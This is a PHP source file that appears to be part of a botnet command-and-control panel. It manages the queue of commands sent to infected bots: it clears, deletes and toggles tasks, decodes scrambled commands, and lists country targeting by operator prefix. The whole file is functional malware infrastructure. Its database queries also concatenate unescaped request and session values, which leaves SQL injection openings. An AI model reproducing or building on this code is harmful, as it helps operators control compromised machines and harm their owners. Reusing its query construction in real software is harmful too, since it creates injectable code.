<?php

$smarty->allow_php_tag = true;
include_once('modules/bots/country_code.php');
if($Cur['str'] == 'all'){
	if(function_exists('save_history_log')){
		save_history_log('Action: Clear all task');
	}
	
	$mysqli->query('TRUNCATE TABLE bf_cmds');
	$mysqli->query('UPDATE bf_bots SET cmd_history = \'\'');
	$mysqli->query('UPDATE bf_bots SET notask = \'0\'');	
}elseif(!empty($Cur['id'])){
	$cmd = $mysqli->query('SELECT * FROM bf_cmds WHERE (id = \''.$Cur['id'].'\') LIMIT 1');
	if($cmd->id == $Cur['id']){
		switch($Cur['type']){
			case 1:
				if(function_exists('save_history_log')){
					thl('Action: Delete task');
					thl('Task ID: ' . $cmd->id);
					save_history_log();
				}
				
				$mysqli->query('delete from bf_cmds WHERE (id = \''.$cmd->id.'\') LIMIT 1');
			break;
		
			default:
				if($cmd->enable == '1'){
					if(function_exists('save_history_log')){
						thl('Action: Disable task');
						thl('Task ID: ' . $cmd->id);
						save_history_log();
					}
					
					$mysqli->query('UPDATE bf_cmds SET enable = \'0\' WHERE (id = \''.$cmd->id.'\') LIMIT 1');
				}else{
					if(function_exists('save_history_log')){
						thl('Action: Enable task');
						thl('Task ID: ' . $cmd->id);
						save_history_log();
					}
					
					$mysqli->query('UPDATE bf_cmds SET enable = \'1\' WHERE (id = \''.$cmd->id.'\') LIMIT 1');
				}
			break;
		}
	}
}

$cmds = array();

if($config['scramb'] == 1){
	get_function('rc');
	function cmd_init($row){
		global $cmds, $country_code, $rc;
		$row->cmd = rc_decode($row->cmd);
		if($row->country != '*'){
			$row->country = explode('|', $row->country);
			foreach($row->country as &$code){
				$code = $country_code[$code];
			}

			$row->country = implode('<br />', $row->country);
		}
		$cmds[] = $row;
	}
}else{
	function cmd_init($row){
		global $cmds, $country_code;
		if($row->country != '*'){
			$row->country = explode('|', $row->country);
			foreach($row->country as &$code){
				$code = $country_code[$code];
			}

			$row->country = implode('<br />', $row->country);
		}
		$cmds[] = $row;
	}
}

if(empty($_SESSION['user']->config['prefix'])){
	$mysqli->query('SELECT * FROM bf_cmds WHERE (dev = \'0\')', null, 'cmd_init', false);
}else{	$mysqli->query('SELECT * FROM bf_cmds WHERE (dev = \'0\') AND (prefix LIKE \''.$_SESSION['user']->config['prefix'].'|\')', null, 'cmd_init', false);
}

$smarty->assign('cmds', $cmds);

?>